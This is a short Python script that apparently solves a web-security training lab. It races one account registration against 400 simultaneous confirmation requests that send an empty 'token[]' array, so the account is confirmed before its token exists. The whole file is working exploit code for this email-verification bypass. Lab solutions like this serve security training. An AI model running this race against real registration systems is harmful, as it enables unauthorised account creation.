import sys
import os
import threading
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

# get CSRF token from registration page
page = lab.get("/register")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# partial construction race condition:
# the server creates the user record first, then generates the confirmation token
# during the gap, the token is null/empty in the database
# sending POST /confirm?token[]= (empty array) matches the uninitialized token

found = {"username": None}
lock = threading.Lock()

def register(username):
    lab.post("/register", data={
        "csrf": csrf,
        "username": username,
        "email": f"{username}@ginandjuice.shop",
        "password": "lol123",
    })

def confirm():
    resp = lab.post("/confirm", params={"token[]": ""})
    if resp.status_code != 400 and "confirmed" in resp.text.lower():
        with lock:
            found["username"] = True

lab.info("Racing registration against confirmation requests...")

for i in range(20):
    username = f"attacker{i}"

    # fire registration + 400 confirmation attempts simultaneously
    threads = [threading.Thread(target=register, args=(username,))]
    for _ in range(400):
        threads.append(threading.Thread(target=confirm))

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    if found["username"]:
        lab.success(f"Race won! Try logging in as attacker0-{i} with password lol123")
        break

lab.warn("This lab is timing-sensitive - use Turbo Intruder in Burp for reliable exploitation")
lab.warn("The script sends registration + 400 confirmation requests per batch")
